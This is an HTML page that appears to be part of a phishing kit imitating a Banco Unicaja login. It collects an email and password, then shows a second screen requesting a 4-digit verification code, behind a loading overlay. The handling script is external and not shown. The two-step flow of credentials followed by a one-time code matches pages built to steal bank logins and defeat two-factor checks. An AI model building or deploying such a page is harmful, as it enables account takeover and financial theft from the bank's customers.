<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Banco Unicaja | Login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background: #f8f9fa;
    }

    .forgot-wrap {
      margin-top: 8px;
      text-align: right;
    }

    .forgot-link {
      font-size: 0.9rem;
      text-decoration: none;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .card {
      border-radius: 10px;
    }

    .code-box {
      display: none;
    }

    /* Loader */
    #loader {
      position: fixed;
      inset: 0;
      background: white;
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
  </style>
</head>

<body class="d-flex justify-content-center align-items-center vh-100">

  <!-- LOGIN BOX -->
  <div class="card p-4 shadow" style="width: 100%; max-width: 400px;" id="loginBox">
    <h4 class="text-center mb-3 text-success">Banco Unicaja</h4>
    <div id="errorMsg" class="text-danger text-center mb-2 d-none">Incorrect login details</div>

    <div class="mb-3">
      <input type="email" id="email" class="form-control" placeholder="Email">
    </div>
    <div class="mb-3">
      <input type="password" id="password" class="form-control" placeholder="Password">
    </div>
    <button onclick="handleLogin()" class="btn btn-success w-100">Login</button>
    <div class="forgot-wrap">
      <a class="forgot-link" href="#">Forgot password?</a>
    </div>
  </div>

  <!-- CODE BOX -->
  <div class="card p-4 shadow code-box" style="width: 100%; max-width: 400px;" id="codeBox">
    <h4 class="text-center mb-3">Verification</h4>
    <p class="text-center text-muted">Enter your 4-digit verification code</p>
    <div id="codeError" class="text-danger text-center mb-2 d-none">Invalid code, try again</div>

    <div class="mb-3">
      <input type="text" id="code" maxlength="4" class="form-control text-center" placeholder="----">
    </div>
    <button onclick="verifyCode()" class="btn btn-success w-100">Verify</button>
  </div>

  <!-- LOADER -->
  <div id="loader">
    <div class="spinner-border text-success" role="status">
      <span class="visually-hidden">Loading...</span>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
